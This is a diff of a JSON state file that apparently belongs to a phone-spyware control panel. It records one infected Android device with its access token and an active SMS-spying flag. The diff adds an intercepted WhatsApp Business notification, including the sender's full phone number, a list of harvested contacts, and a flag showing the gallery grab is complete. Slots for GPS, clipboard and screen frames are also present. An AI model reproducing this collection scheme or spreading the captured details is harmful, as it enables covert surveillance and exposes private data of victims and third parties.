@@ -165,7 +165,7 @@
     "deviceName": "HP-SAYANG-CF41",
     "ownerUsername": "GANANG",
     "token": "511c843889490f24a83fdf9ff1ebec0c",
-    "lastSeen": 1775629367580,
+    "lastSeen": 1775629385599,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:21:32.558Z",
@@ -181,6 +181,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "‎3 pesan baru",
+        "time": "08/04 13:22",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775629367779
+      },
       {
         "appName": "WA Business",
         "sender": "+62 815-2386-4283",
@@ -207,8 +215,25 @@
       }
     ],
     "galleryPhotos": [],
-    "galleryDone": false,
-    "contacts": [],
+    "galleryDone": true,
+    "contacts": [
+      {
+        "name": "Cek Pulsa",
+        "phone": "*808#"
+      },
+      {
+        "name": "Customer Care Axis",
+        "phone": "838"
+      },
+      {
+        "name": "Customer Care XL",
+        "phone": "818"
+      },
+      {
+        "name": "‏Carlcare Layanan Hotline‏",
+        "phone": "02150955121"
+      }
+    ],
     "lastGps": null,
     "gpsList": [],
     "lastClipboard": null,
